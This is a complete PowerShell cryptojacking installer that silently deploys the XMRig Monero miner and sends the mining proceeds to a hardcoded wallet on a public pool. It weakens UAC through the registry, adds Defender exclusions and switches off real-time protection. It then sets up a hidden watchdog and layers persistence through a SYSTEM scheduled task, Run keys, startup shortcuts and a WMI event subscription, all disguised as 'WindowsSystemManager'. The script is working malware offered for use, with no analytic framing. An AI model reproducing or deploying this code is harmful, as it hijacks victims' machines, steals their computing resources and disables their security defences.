# XMRig Silent Installer with Multi-layer Persistence
# Runs completely without user interaction

# Error handling - continue on error
$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue" # Hide progress bars

# Self-elevation mechanism
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $scriptPath = "$env:TEMP\xmrig_installer_$([Guid]::NewGuid().ToString().Substring(0,8)).ps1"
    
    # Clone this script to temp location
    $scriptContent = @'
# Full script content - will be replaced during build
'@
    
    if ($scriptContent -eq "# Full script content - will be replaced during build") {
        # If running from web, get content from $MyInvocation
        $scriptContent = $MyInvocation.MyCommand.ScriptBlock.ToString()
    }
    
    # Save to temp file
    Set-Content -Path $scriptPath -Value $scriptContent -Force
    
    # Create elevation process without prompts (needs registry modification)
    $regPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    if (-not (Test-Path $regPath)) {
        New-Item -Path $regPath -Force | Out-Null
    }
    
    # Temporarily disable UAC prompts
    $oldValue = $null
    if (Test-Path $regPath) {
        $oldValue = (Get-ItemProperty -Path $regPath -Name "ConsentPromptBehaviorUser" -ErrorAction SilentlyContinue).ConsentPromptBehaviorUser
        Set-ItemProperty -Path $regPath -Name "ConsentPromptBehaviorUser" -Value 0 -Type DWord -Force
    }
    
    # Start elevated process hidden
    $startInfo = New-Object System.Diagnostics.ProcessStartInfo
    $startInfo.FileName = "powershell.exe"
    $startInfo.Arguments = "-ExecutionPolicy Bypass -NoProfile -File `"$scriptPath`""
    $startInfo.UseShellExecute = $true
    $startInfo.Verb = "runas"
    $startInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    
    try {
        $process = [System.Diagnostics.Process]::Start($startInfo)
        if ($process -ne $null) {
            # Wait for process to finish
            $process.WaitForExit()
        }
    } catch {
        # Fallback to non-hidden elevation if hidden fails
        Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -NoProfile -File `"$scriptPath`"" -Verb RunAs -Wait
    }
    
    # Restore UAC setting
    if ($oldValue -ne $null) {
        Set-ItemProperty -Path $regPath -Name "ConsentPromptBehaviorUser" -Value $oldValue -Type DWord -Force
    }
    
    # Clean up
    Remove-Item -Path $scriptPath -Force
    
    exit
}

# Configuration
$installDir = "C:\win\xmrig-main"
$xmrigUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-gcc-win64.zip"
$xmrigZip = "$env:TEMP\xmrig.zip"
$taskName = "WindowsSystemManager"
$description = "Manages critical Windows system components and updates"
$globalMutexName = "Global\XMRigGlobalMutex"
$instanceMutexName = "Global\XMRigInstallerMutex"

# Create an instance mutex to ensure only one installer runs at a time
$instanceMutex = New-Object System.Threading.Mutex($false, $instanceMutexName, [ref]$null)

# Try to get instance mutex ownership - exit if another instance is running
if (-not $instanceMutex.WaitOne(0, $false)) {
    exit
}

# Create a global mutex that will persist beyond this script
# This will be used by the watchdog to ensure only one miner instance
try {
    $globalMutex = New-Object System.Threading.Mutex($true, $globalMutexName, [ref]$mutexCreated)
} catch {
    # Mutex already exists
}

# Create randomized directory if specified directory isn't available
if (-not (Test-Path $installDir -PathType Container)) {
    try {
        New-Item -ItemType Directory -Path $installDir -Force | Out-Null
    } catch {
        # Fallback to temp directory with random name if C:\win is not available
        $installDir = "$env:PROGRAMDATA\Microsoft\Windows\$([Guid]::NewGuid().ToString().Substring(0,8))"
        New-Item -ItemType Directory -Path $installDir -Force | Out-Null
    }
}

# Function to clean up existing XMRig processes
function Stop-ExistingProcesses {
    # Stop any existing xmrig processes
    Get-Process -Name "xmrig" -ErrorAction SilentlyContinue | ForEach-Object {
        try {
            $_ | Stop-Process -Force
            Start-Sleep -Seconds 1
        } catch {}
    }
    
    # Stop any existing wscript processes related to XMRig
    Get-WmiObject Win32_Process -Filter "name = 'wscript.exe'" | ForEach-Object {
        try {
            $cmdline = $_.CommandLine
            if ($cmdline -like "*xmrig*" -or $cmdline -like "*watchdog*" -or $cmdline -like "*monitor*") {
                $_.Terminate()
            }
        } catch {}
    }
    
    # Make sure all processes are stopped before continuing
    Start-Sleep -Seconds 2
}

# Function to detect system specs for optimal config
function Get-SystemSpecs {
    $cpu = Get-WmiObject -Class Win32_Processor
    $memory = Get-WmiObject -Class Win32_ComputerSystem
    
    $specs = @{
        Threads = [Math]::Max(1, $cpu.NumberOfLogicalProcessors - 1)
        MemoryGB = [Math]::Round($memory.TotalPhysicalMemory / 1GB, 2)
        IsVirtual = ($cpu.Manufacturer -match 'VMware|QEMU|Xen' -or $cpu.Name -match 'Virtual')
        HasAES = ($cpu.Name -notmatch 'Celeron|Atom' -and $cpu.Name -match 'Intel|AMD')
    }
    
    return $specs
}

# Function to evade antivirus
function Add-Exclusions {
    # Add exclusions to Windows Defender
    Add-MpPreference -ExclusionPath $installDir -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "xmrig.exe" -ErrorAction SilentlyContinue
    
    # Disable real-time monitoring temporarily
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
}

# Function to clean up existing persistence mechanisms
function Remove-ExistingPersistence {
    # 1. Remove scheduled tasks
    Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
    Get-ScheduledTask -TaskName "XMRig Simple Watchdog" -ErrorAction SilentlyContinue | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
    
    # 2. Remove registry keys
    $regPathSystem = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    $regPathUser = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    
    if (Test-Path $regPathSystem) {
        Remove-ItemProperty -Path $regPathSystem -Name "WindowsSystemManager" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path $regPathSystem -Name "XMRigWatchdog" -ErrorAction SilentlyContinue
    }
    
    if (Test-Path $regPathUser) {
        Remove-ItemProperty -Path $regPathUser -Name "WindowsSystemUpdate" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path $regPathUser -Name "XMRigWatchdog" -ErrorAction SilentlyContinue
    }
    
    # 3. Remove startup shortcuts
    $startupFolderUser = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
    $startupFolderAllUsers = "$env:ALLUSERSPROFILE\Microsoft\Windows\Start Menu\Programs\StartUp"
    
    Remove-Item -Path "$startupFolderUser\WindowsSystemManager.lnk" -ErrorAction SilentlyContinue
    Remove-Item -Path "$startupFolderUser\XMRigWatchdog.lnk" -ErrorAction SilentlyContinue
    Remove-Item -Path "$startupFolderAllUsers\WindowsSystemManager.lnk" -ErrorAction SilentlyContinue
    
    # 4. Remove WMI Event Subscription
    try {
        $eventFilterName = "WindowsSystemManagerFilter"
        $consumerName = "WindowsSystemManagerConsumer"
        
        $wmiParams = @{
            Class = "__FilterToConsumerBinding"
            Namespace = "root\subscription"
            Filter = "Filter = ""__EventFilter.Name='$eventFilterName'"" AND Consumer = ""CommandLineEventConsumer.Name='$consumerName'"""
        }
        
        $binding = Get-WmiObject @wmiParams -ErrorAction SilentlyContinue
        if ($binding) {
            $binding | Remove-WmiObject
        }
        
        $wmiParams = @{
            Class = "__EventFilter"
            Namespace = "root\subscription"
            Filter = "Name='$eventFilterName'"
        }
        
        $filter = Get-WmiObject @wmiParams -ErrorAction SilentlyContinue
        if ($filter) {
            $filter | Remove-WmiObject
        }
        
        $wmiParams = @{
            Class = "CommandLineEventConsumer"
            Namespace = "root\subscription"
            Filter = "Name='$consumerName'"
        }
        
        $consumer = Get-WmiObject @wmiParams -ErrorAction SilentlyContinue
        if ($consumer) {
            $consumer | Remove-WmiObject
        }
    } catch {}
}

# Stop any existing processes
Stop-ExistingProcesses

# Clean up existing persistence
Remove-ExistingPersistence

# Get system specs
$specs = Get-SystemSpecs

# Try to add exclusions
Add-Exclusions

# Download XMRig if not already downloaded
if (-not (Test-Path "$installDir\xmrig.exe")) {
    try {
        # Download with different methods for resilience
        try {
            Invoke-WebRequest -Uri $xmrigUrl -OutFile $xmrigZip -UseBasicParsing
        } catch {
            # Fallback download method
            (New-Object System.Net.WebClient).DownloadFile($xmrigUrl, $xmrigZip)
        }
        
        # Extract the zip file
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        
        try {
            [System.IO.Compression.ZipFile]::ExtractToDirectory($xmrigZip, "$env:TEMP\xmrig-extract")
            
            # Copy the xmrig.exe to install dir (skip config.json as we generate our own)
            $xmrigExe = Get-ChildItem -Path "$env:TEMP\xmrig-extract" -Recurse -Filter "xmrig.exe" | Select-Object -First 1
            Copy-Item -Path $xmrigExe.FullName -Destination "$installDir\xmrig.exe" -Force
        } catch {
            # Manual extraction fallback
            $shell = New-Object -ComObject Shell.Application
            $zipFile = $shell.NameSpace($xmrigZip)
            $targetDir = $shell.NameSpace("$env:TEMP\xmrig-extract")
            $targetDir.CopyHere($zipFile.Items())
            
            # Find the xmrig.exe and copy it
            $xmrigPath = (Get-ChildItem -Path "$env:TEMP\xmrig-extract" -Recurse -Filter "xmrig.exe" | Select-Object -First 1).FullName
            if ($xmrigPath) {
                Copy-Item -Path $xmrigPath -Destination "$installDir\xmrig.exe" -Force
            }
        }
    } catch {
        # If download fails, check for alternative sources or exit silently
    } finally {
        # Clean up
        Remove-Item -Path $xmrigZip -Force -ErrorAction SilentlyContinue
        Remove-Item -Path "$env:TEMP\xmrig-extract" -Recurse -Force -ErrorAction SilentlyContinue
    }
}

# Create or update the config file
# Always ensure our wallet and settings are present
$configContent = @"
{
    "autosave": true,
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "hw-aes": $hwAes,
        "priority": 0,
        "memory-pool": false,
        "yield": true,
        "max-threads-hint": $threadCount,
        "asm": true,
        "argon2-impl": null,
        "cn/0": false,
        "cn-lite/0": false
    },
    "opencl": {
        "enabled": false
    },
    "cuda": {
        "enabled": false
    },
    "donate-level": 1,
    "donate-over-proxy": 1,
    "log-file": "$($installDir.Replace('\','\\'))\\xmrig.log",
    "pools": [
        {
            "algo": null,
            "coin": "XMR",
            "url": "xmrpool.eu:5555",
            "user": "4AHxVmrWgk2SyHFLR9LoGxhW14fxe8cDQbKFfoyhWtavJVdUVREUP33jBkQtqSPfw4HZLAgEiA9SkbwXaXCqRMj44VuQ4n9",
            "pass": "x",
            "rig-id": "$($env:COMPUTERNAME)",
            "nicehash": false,
            "keepalive": true,
            "enabled": true,
            "tls": false,
            "tls-fingerprint": null,
            "daemon": false
        }
    ],
    "retries": 5,
    "retry-pause": 5,
    "print-time": 60,
    "health-print-time": 60,
    "dmi": true,
    "syslog": false,
    "tls": {
        "enabled": false,
        "protocols": null,
        "cert": null,
        "cert_key": null,
        "ciphers": null,
        "ciphersuites": null,
        "dhparam": null
    },
    "user-agent": null,
    "verbose": 0,
    "watch": true,
    "pause-on-battery": false,
    "pause-on-active": false
}
"@ 
Set-Content -Path "$installDir\config.json" -Value $configContent -Force -Encoding UTF8

# Setup persistence mechanisms

# 1. Create watchdog script
$watchdogPath = "$installDir\watchdog.ps1"
@"
# XMRig Watchdog Script
`$ErrorActionPreference = "SilentlyContinue"
`$logFile = "`$PSScriptRoot\watchdog.log"
`$xmrigPath = "`$PSScriptRoot\xmrig.exe"
`$globalMutexName = "Global\XMRigGlobalMutex"
`$globalMutex = `$null

function Write-Log {
    param(`$message)
    try {
        `$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        "`$timestamp - `$message" | Out-File -Append -FilePath `$logFile -Force
    } catch {}
}

Write-Log "Watchdog started"

# Check if XMRig path exists
if (Test-Path `$xmrigPath) {
    Write-Log "XMRig executable found at `$xmrigPath"
} else {
    Write-Log "ERROR: XMRig executable not found at `$xmrigPath"
    exit
}

# Try to acquire the global mutex to ensure only one instance
try {
    `$globalMutex = New-Object System.Threading.Mutex(`$false, `$globalMutexName, [ref]`$mutexCreated)
    if (-not `$globalMutex.WaitOne(0, `$false)) {
        Write-Log "Another watchdog instance is already running. Exiting."
        exit
    }
    Write-Log "Acquired global mutex"
} catch {
    Write-Log "Error acquiring global mutex: `$(`$_.Exception.Message)"
}

# Function to check if XMRig is already running
function Test-XMRigRunning {
    `$running = `$false
    `$processes = @(Get-Process -Name "xmrig" -ErrorAction SilentlyContinue)
    
    if (`$processes.Count -gt 0) {
        Write-Log "Found `$(`$processes.Count) running XMRig process(es)"
        `$running = `$true
        
        # If there are multiple instances, keep only one
        if (`$processes.Count -gt 1) {
            Write-Log "Multiple XMRig instances found. Keeping only the oldest one."
            # Sort by start time
            `$sortedProcesses = `$processes | Sort-Object -Property StartTime
            
            # Skip the first (oldest) process and kill the rest
            for (`$i = 1; `$i -lt `$sortedProcesses.Count; `$i++) {
                try {
                    `$sortedProcesses[`$i] | Stop-Process -Force
                    Write-Log "Terminated duplicate process with PID `$(`$sortedProcesses[`$i].Id)"
                } catch {
                    Write-Log "Failed to terminate duplicate process: `$(`$_.Exception.Message)"
                }
            }
        }
    }
    
    return `$running
}

# Continuous monitoring loop
while (`$true) {
    try {
        # Check if XMRig is running
        `$isRunning = Test-XMRigRunning
        
        if (-not `$isRunning) {
            Write-Log "XMRig not running, starting process"
            
            # Try to start process with different methods
            try {
                # Method 1: Start with Start-Process
                Start-Process -FilePath `$xmrigPath -WindowStyle Hidden -WorkingDirectory "`$PSScriptRoot"
            } catch {
                try {
                    # Method 2: Start with WMI
                    `$WMI = [WMICLASS]"Win32_Process"
                    `$result = `$WMI.Create("`$xmrigPath", "`$PSScriptRoot", `$null)
                } catch {
                    try {
                        # Method 3: Start with shell
                        `$shell = New-Object -ComObject WScript.Shell
                        `$shell.Run("`$xmrigPath", 0, `$false)
                    } catch {
                        # Last resort: cmd
                        cmd /c start /min "" "`$xmrigPath"
                    }
                }
            }
            
            Write-Log "XMRig process started"
        } else {
            # Check if any process is not responding
            `$process = Get-Process -Name "xmrig" -ErrorAction SilentlyContinue | Where-Object { -not `$_.Responding }
            if (`$process) {
                Write-Log "Found non-responsive XMRig process with PID `$(`$process.Id), restarting"
                try { 
                    Stop-Process -Id `$process.Id -Force 
                    Start-Sleep -Seconds 2
                    Start-Process -FilePath `$xmrigPath -WindowStyle Hidden -WorkingDirectory "`$PSScriptRoot"
                } catch {}
            } else {
                Write-Log "XMRig is running normally"
            }
        }
    } catch {
        Write-Log "Error in watchdog: `$(`$_.Exception.Message)"
    }
    
    # Wait before checking again
    Start-Sleep -Seconds 60
}

# Release the mutex if we exit the loop
if (`$globalMutex -ne `$null) {
    `$globalMutex.ReleaseMutex()
    `$globalMutex.Close()
}
"@ | Set-Content -Path $watchdogPath -Force

# 2. Create VBS launchers for hidden execution
$vbsWatchdogPath = "$installDir\watchdog_launcher.vbs"
@"
On Error Resume Next
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ""$watchdogPath""", 0, false
"@ | Set-Content -Path $vbsWatchdogPath -Force -Encoding ASCII

$vbsXmrigPath = "$installDir\xmrig_launcher.vbs"
@"
On Error Resume Next
Set WshShell = CreateObject("WScript.Shell")
WshShell.CurrentDirectory = "$installDir"
WshShell.Run """$installDir\xmrig.exe""", 0, false
"@ | Set-Content -Path $vbsXmrigPath -Force -Encoding ASCII

# 3. Setup scheduled tasks for persistence
# Create the system task for the watchdog
$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument """$vbsWatchdogPath"""
$trigger1 = New-ScheduledTaskTrigger -AtStartup
$trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 15)
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -ExecutionTimeLimit (New-TimeSpan -Days 365)
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

# Try to register with SYSTEM account
try {
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger @($trigger1, $trigger2) -Settings $settings -Principal $principal -Description $description -Force -ErrorAction Stop
} catch {
    # Fallback to current user if SYSTEM fails
    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    $principal = New-ScheduledTaskPrincipal -UserId $currentUser -LogonType Interactive -RunLevel Highest
    
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger @($trigger1, $trigger2) -Settings $settings -Principal $principal -Description $description -Force -ErrorAction SilentlyContinue
}

# 4. Registry persistence
# HKLM Run key (requires admin)
$regPathSystem = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
$regNameSystem = "WindowsSystemManager"
$regValueSystem = "wscript.exe ""$vbsWatchdogPath"""

if (Test-Path $regPathSystem) {
    New-ItemProperty -Path $regPathSystem -Name $regNameSystem -Value $regValueSystem -PropertyType String -Force -ErrorAction SilentlyContinue
}

# HKCU Run key (fallback)
$regPathUser = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regNameUser = "WindowsSystemUpdate"
$regValueUser = "wscript.exe ""$vbsWatchdogPath"""

if (Test-Path $regPathUser) {
    New-ItemProperty -Path $regPathUser -Name $regNameUser -Value $regValueUser -PropertyType String -Force -ErrorAction SilentlyContinue
}

# 5. Startup folder persistence
$startupFolderUser = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$startupFolderAllUsers = "$env:ALLUSERSPROFILE\Microsoft\Windows\Start Menu\Programs\StartUp"

# Create shortcuts in startup folders
$shortcutPathUser = "$startupFolderUser\WindowsSystemManager.lnk"
try {
    $shell = New-Object -ComObject WScript.Shell
    $shortcut = $shell.CreateShortcut($shortcutPathUser)
    $shortcut.TargetPath = "wscript.exe"
    $shortcut.Arguments = """$vbsWatchdogPath"""
    $shortcut.WorkingDirectory = $installDir
    $shortcut.Description = "Windows System Management Service"
    $shortcut.IconLocation = "shell32.dll,43"
    $shortcut.Save()
} catch {}

# Try to add to all users startup (requires admin)
$shortcutPathAllUsers = "$startupFolderAllUsers\WindowsSystemManager.lnk"
try {
    $shell = New-Object -ComObject WScript.Shell
    $shortcut = $shell.CreateShortcut($shortcutPathAllUsers)
    $shortcut.TargetPath = "wscript.exe"
    $shortcut.Arguments = """$vbsWatchdogPath"""
    $shortcut.WorkingDirectory = $installDir
    $shortcut.Description = "Windows System Management Service"
    $shortcut.IconLocation = "shell32.dll,43"
    $shortcut.Save()
} catch {}

# 6. WMI Event Subscription for additional persistence
try {
    # Create event filter for startup
    $eventFilterName = "WindowsSystemManagerFilter"
    $query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
    
    $filterPath = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
        Name = $eventFilterName
        EventNamespace = "root\cimv2"
        QueryLanguage = "WQL"
        Query = $query
    }
    
    # Create the consumer
    $consumerName = "WindowsSystemManagerConsumer"
    
    $consumerPath = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
        Name = $consumerName
        ExecutablePath = "C:\Windows\System32\wscript.exe"
        CommandLineTemplate = """$vbsWatchdogPath"""
    }
    
    # Create the binding
    $bindingPath = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
        Filter = $filterPath
        Consumer = $consumerPath
    }
} catch {}

# 7. Start the processes
try {
    # Start the watchdog (which will manage XMRig)
    Start-Process -FilePath "wscript.exe" -ArgumentList """$vbsWatchdogPath""" -WindowStyle Hidden
    
    # Start the scheduled task
    Start-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
} catch {}

# 8. Clean up and release mutex
$instanceMutex.ReleaseMutex()
$instanceMutex.Close()

# Exit silently
exit 